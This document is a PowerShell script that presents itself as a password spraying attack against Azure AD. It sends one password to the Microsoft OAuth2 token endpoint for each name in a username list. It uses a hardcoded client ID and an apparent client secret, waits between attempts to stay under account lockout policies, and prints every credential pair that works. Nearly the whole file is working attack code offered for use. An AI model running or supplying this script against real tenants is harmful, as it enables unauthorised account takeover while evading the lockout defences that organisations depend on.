<#
.SYNOPSIS
    Password spraying attack against Azure AD with lockout detection.
.DESCRIPTION
    Attempts to authenticate with a single password against multiple Azure AD
    users. Includes throttling and lockout detection to avoid triggering
    account lockout policies.
.PARAMETER UsernameList
    Path to file containing list of Azure AD usernames (one per line)
.PARAMETER Password
    Password to spray
.PARAMETER Throttle
    Seconds to wait between attempts (default: 3)
.EXAMPLE
    .\azuread-pwdspray.ps1 -UsernameList users.txt -Password "Winter2024!" -Throttle 3
#>

param(
    [Parameter(Mandatory=$true)]
    [string]$UsernameList,

    [Parameter(Mandatory=$true)]
    [string]$Password,

    [Parameter(Mandatory=$false)]
    [int]$Throttle = 3
)

Write-Host "[*] Azure AD Password Spray" -ForegroundColor Cyan
Write-Host "[*] User list: $UsernameList"
Write-Host "[*] Throttle: ${Throttle}s between attempts"

# Load usernames
$users = Get-Content $UsernameList
Write-Host "[+] Loaded $($users.Count) usernames" -ForegroundColor Green

$successes = @()
$lockouts = 0
$totalAttempts = 0

foreach ($user in $users) {
    $user = $user.Trim()
    if ($user -eq "") { continue }

    $totalAttempts++
    Write-Host "`n[*] Attempting: $user" -ForegroundColor Yellow

    try {
        $cred = New-Object System.Management.Automation.PSCredential($user, (ConvertTo-SecureString $Password -AsPlainText -Force))
        $result = Invoke-WebRequest -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Method POST -Body @{
            client_id = "1950f2b8-7aaf-48c9-983e-5d5e37b45e6e"
            client_secret = "G~v.6T6jJ4y5JdM_q.~qFq~Y5v.4~J~v.6T6jJ4y5JdM"
            grant_type = "password"
            username = $user
            password = $Password
            scope = "openid"
        } -UseBasicParsing

        if ($result.StatusCode -eq 200) {
            Write-Host "[+] SUCCESS: $user" -ForegroundColor Green
            $successes += $user
        } else {
            Write-Host "[-] Failed: $user (status $($result.StatusCode))" -ForegroundColor Red
        }
    } catch {
        if ($_.Exception.Response.StatusCode -eq 401) {
            Write-Host "[-] Failed: $user (401 Unauthorized)" -ForegroundColor Red
        } elseif ($_.Exception.Response.StatusCode -eq 403) {
            Write-Host "[!] Possible lockout: $user (403 Forbidden)" -ForegroundColor Yellow
            $lockouts++
        } else {
            Write-Host "[!] Error: $user - $_" -ForegroundColor Red
        }
    }

    Start-Sleep -Seconds $Throttle
}

Write-Host "`n=== Results ===" -ForegroundColor Cyan
Write-Host "Total attempts: $totalAttempts"
Write-Host "Successful: $($successes.Count)"
Write-Host "Lockouts: $lockouts"

if ($successes.Count -gt 0) {
    Write-Host "`nSuccessful credentials:" -ForegroundColor Green
    foreach ($s in $successes) {
        Write-Host "  $s : $Password"
    }
}